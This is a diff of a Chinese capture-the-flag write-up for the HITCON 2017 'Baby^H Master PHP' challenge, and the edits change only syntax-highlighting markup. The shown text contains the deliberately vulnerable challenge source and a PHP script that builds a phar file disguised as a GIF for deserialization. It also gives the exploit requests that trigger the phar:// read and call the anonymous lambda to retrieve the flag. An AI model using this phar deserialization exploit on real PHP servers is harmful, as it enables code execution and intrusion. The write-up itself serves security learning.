@@ -102,39 +102,39 @@
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
 <span class="nv">$FLAG</span> <span class="o">=</span> <span class="nb">create_function</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="s1">'die(`/read_flag`);'</span><span class="p">);</span>
 <span class="nv">$SECRET</span> <span class="o">=</span> <span class="sb">`/read_secret`</span><span class="p">;</span>
-<span class="nv">$SANDBOX</span> <span class="o">=</span> <span class="s2">"/var/www/data/"</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]);</span>
+<span class="nv">$SANDBOX</span> <span class="o">=</span> <span class="s2">"/var/www/data/"</span> <span class="mf">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="mf">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]);</span>
 <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$SANDBOX</span><span class="p">);</span>
 <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$SANDBOX</span><span class="p">);</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"session-data"</span><span class="p">]))</span> <span class="p">{</span>
-	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="nv">$SANDBOX</span><span class="p">));</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"session-data"</span><span class="p">]))</span> <span class="p">{</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">User</span><span class="p">(</span><span class="nv">$SANDBOX</span><span class="p">));</span>
 	<span class="nv">$hmac</span> <span class="o">=</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s2">"sha1"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$SECRET</span><span class="p">);</span>
 	<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"session-data"</span><span class="p">,</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"%s-----%s"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$hmac</span><span class="p">));</span>
 <span class="p">}</span>
 
 <span class="kd">class</span> <span class="nc">User</span> <span class="p">{</span>
 	<span class="k">public</span> <span class="nv">$avatar</span><span class="p">;</span>
-	<span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
-		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">avatar</span> <span class="o">=</span> <span class="nv">$path</span><span class="p">;</span>
+	<span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">avatar</span> <span class="o">=</span> <span class="nv">$path</span><span class="p">;</span>
 	<span class="p">}</span>
 <span class="p">}</span>
 
 <span class="c1">#######################key class################################</span>
-<span class="kd">class</span> <span class="nc">Admin</span> <span class="k">extends</span> <span class="nx">User</span> <span class="p">{</span>
-	<span class="k">function</span> <span class="nf">__destruct</span><span class="p">()</span> <span class="p">{</span>
+<span class="kd">class</span> <span class="nc">Admin</span> <span class="kd">extends</span> <span class="nc">User</span> <span class="p">{</span>
+	<span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
 		<span class="nv">$random</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
 		<span class="k">eval</span><span class="p">(</span><span class="s2">"function my_function_</span><span class="nv">$random</span><span class="s2">() {"</span>
-			<span class="o">.</span> <span class="s2">"  global </span><span class="se">\$</span><span class="s2">FLAG; </span><span class="se">\$</span><span class="s2">FLAG();"</span>
-			<span class="o">.</span> <span class="s2">"}"</span><span class="p">);</span>
+			<span class="mf">.</span> <span class="s2">"  global </span><span class="se">\$</span><span class="s2">FLAG; </span><span class="se">\$</span><span class="s2">FLAG();"</span>
+			<span class="mf">.</span> <span class="s2">"}"</span><span class="p">);</span>
 		<span class="nv">$_GET</span><span class="p">[</span><span class="s2">"lucky"</span><span class="p">]();</span>
 	<span class="p">}</span>
 <span class="p">}</span>
 <span class="c1">#######################key class################################</span>
-<span class="k">function</span> <span class="nf">check_session</span><span class="p">()</span> <span class="p">{</span>
+<span class="k">function</span> <span class="n">check_session</span><span class="p">()</span> <span class="p">{</span>
 	<span class="k">global</span> <span class="nv">$SECRET</span><span class="p">;</span>
 	<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"session-data"</span><span class="p">];</span>
 	<span class="k">list</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$hmac</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"-----"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">#从cookie中取出data和hmac签名</span>
-	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$hmac</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$hmac</span><span class="p">))</span> <span class="c1">#判空</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$hmac</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$hmac</span><span class="p">))</span> <span class="c1">#判空</span>
 	<span class="p">{</span>
 		<span class="k">die</span><span class="p">(</span><span class="s2">"Bye"</span><span class="p">);</span>
 	<span class="p">}</span>
@@ -145,38 +145,38 @@
 	<span class="p">}</span>
 
 	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">#反序列化</span>
-	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$data</span><span class="o">-&gt;</span><span class="na">avatar</span><span class="p">))</span> <span class="c1">#如果反序列化之后的data包含的类中无avatar成员,退出</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="o">-&gt;</span><span class="n">avatar</span><span class="p">))</span> <span class="c1">#如果反序列化之后的data包含的类中无avatar成员,退出</span>
 	<span class="p">{</span>
 		<span class="k">die</span><span class="p">(</span><span class="s2">"Bye Bye Bye"</span><span class="p">);</span>
 	<span class="p">}</span>
 
-	<span class="k">return</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="na">avatar</span><span class="p">;</span>
+	<span class="k">return</span> <span class="nv">$data</span><span class="o">-&gt;</span><span class="n">avatar</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="k">function</span> <span class="nf">upload</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
-	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"url"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"/avatar.gif"</span><span class="p">);</span>
+<span class="k">function</span> <span class="n">upload</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"url"</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"/avatar.gif"</span><span class="p">);</span>
 	<span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">"GIF89a"</span><span class="p">)</span> <span class="p">{</span>
 		<span class="k">die</span><span class="p">(</span><span class="s2">"Fuck off"</span><span class="p">);</span>
 	<span class="p">}</span>
 
-	<span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="s2">"/avatar.gif"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+	<span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$path</span> <span class="mf">.</span> <span class="s2">"/avatar.gif"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
 	<span class="k">die</span><span class="p">(</span><span class="s2">"Upload OK"</span><span class="p">);</span>
 <span class="p">}</span>
 
-<span class="k">function</span> <span class="nf">show</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
-	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="s2">"/avatar.gif"</span><span class="p">))</span> <span class="p">{</span>
+<span class="k">function</span> <span class="n">show</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$path</span> <span class="mf">.</span> <span class="s2">"/avatar.gif"</span><span class="p">))</span> <span class="p">{</span>
 		<span class="nv">$path</span> <span class="o">=</span> <span class="s2">"/var/www/html"</span><span class="p">;</span>
 	<span class="p">}</span>
 
 	<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: image/gif"</span><span class="p">);</span>
-	<span class="k">die</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$path</span> <span class="o">.</span> <span class="s2">"/avatar.gif"</span><span class="p">));</span>
+	<span class="k">die</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$path</span> <span class="mf">.</span> <span class="s2">"/avatar.gif"</span><span class="p">));</span>
 <span class="p">}</span>
 
 <span class="nv">$mode</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"m"</span><span class="p">];</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="s2">"upload"</span><span class="p">)</span> <span class="p">{</span>
-	<span class="nx">upload</span><span class="p">(</span><span class="nx">check_session</span><span class="p">());</span> <span class="c1">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span>
+	<span class="nf">upload</span><span class="p">(</span><span class="nf">check_session</span><span class="p">());</span> <span class="c1">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span>
 <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">==</span> <span class="s2">"show"</span><span class="p">)</span> <span class="p">{</span>
-	<span class="nx">show</span><span class="p">(</span><span class="nx">check_session</span><span class="p">());</span> <span class="c1">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif</span>
+	<span class="nf">show</span><span class="p">(</span><span class="nf">check_session</span><span class="p">());</span> <span class="c1">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 	<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
 <span class="p">}</span>
@@ -208,7 +208,7 @@
       </ul>
     </blockquote>
   </li>
-  <li>而且题目内upload操作提供了<code class="highlighter-rouge">file_get_content()</code>函数 其中地址可控,可以利用<code class="highlighter-rouge">phar://</code>协议读取本地phar文件(phar协议不支持远程文件<a href="http://php.net/manual/zh/phar.using.stream.php">The <em>phar</em> stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the allow_url_fopen and allow_url_include INI options are disabled.
+  <li>而且题目内upload操作提供了<code class="language-plaintext highlighter-rouge">file_get_content()</code>函数 其中地址可控,可以利用<code class="language-plaintext highlighter-rouge">phar://</code>协议读取本地phar文件(phar协议不支持远程文件<a href="http://php.net/manual/zh/phar.using.stream.php">The <em>phar</em> stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the allow_url_fopen and allow_url_include INI options are disabled.
 </a>),也就是说只要构造一个phar利用upload写到服务器目录, 其中metadata设置为Admin对象,就可以进入Admin的析构函数了</li>
   <li>接下来的问题就是如何猜出那个随机数?
 答案是基本上猜不出来https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php openssl_random_pseudo_bytes是加密级别的伪随机数生成器https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator 这是题目第二个死胡同</li>
@@ -228,16 +228,16 @@
 <span class="kd">class</span> <span class="nc">Admin</span><span class="p">{</span>
  <span class="k">public</span> <span class="nv">$avatar</span> <span class="o">=</span> <span class="s1">'xxx'</span><span class="p">;</span>
 <span class="p">}</span>
-<span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="k">__DIR__</span><span class="o">.</span><span class="s1">'/avatar.phar'</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Phar</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s1">'/avatar.phar'</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
 <span class="nv">$p</span><span class="p">[</span><span class="s1">'file.php'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'&lt;?php ?&gt;'</span><span class="p">;</span>
-<span class="nv">$p</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="k">new</span> <span class="nx">Admin</span><span class="p">());</span>
-<span class="nv">$p</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="p">);</span>
-<span class="nb">rename</span><span class="p">(</span><span class="k">__DIR__</span><span class="o">.</span><span class="s1">'/avatar.phar'</span><span class="p">,</span><span class="k">__DIR__</span><span class="o">.</span><span class="s1">'/avatar.gif'</span><span class="p">);</span>
+<span class="nv">$p</span><span class="o">-&gt;</span><span class="nf">setMetadata</span><span class="p">(</span><span class="k">new</span> <span class="nc">Admin</span><span class="p">());</span>
+<span class="nv">$p</span><span class="o">-&gt;</span><span class="nf">setStub</span><span class="p">(</span><span class="s1">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="p">);</span>
+<span class="nb">rename</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s1">'/avatar.phar'</span><span class="p">,</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s1">'/avatar.gif'</span><span class="p">);</span>
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
 <ol>
-  <li>再请求<code class="highlighter-rouge">?m=upload&amp;url=http://xxx.xxx.xxx.xxx</code></li>
+  <li>再请求<code class="language-plaintext highlighter-rouge">?m=upload&amp;url=http://xxx.xxx.xxx.xxx</code></li>
   <li>启动Orange大大写的fork脚本</li>
 </ol>
 
@@ -271,7 +271,7 @@
 </code></pre></div></div>
 
 <ol>
-  <li>请求<code class="highlighter-rouge">?m=upload&amp;url=phar:///var/www/data/xxx&amp;lucky=%00lambda_1</code>得到flag
+  <li>请求<code class="language-plaintext highlighter-rouge">?m=upload&amp;url=phar:///var/www/data/xxx&amp;lucky=%00lambda_1</code>得到flag
 <img src="/assets/images/posts/2018/hitcon2017-Baby-H-master-php-2017-复现/11.png" alt="flag" /></li>
 </ol>
 
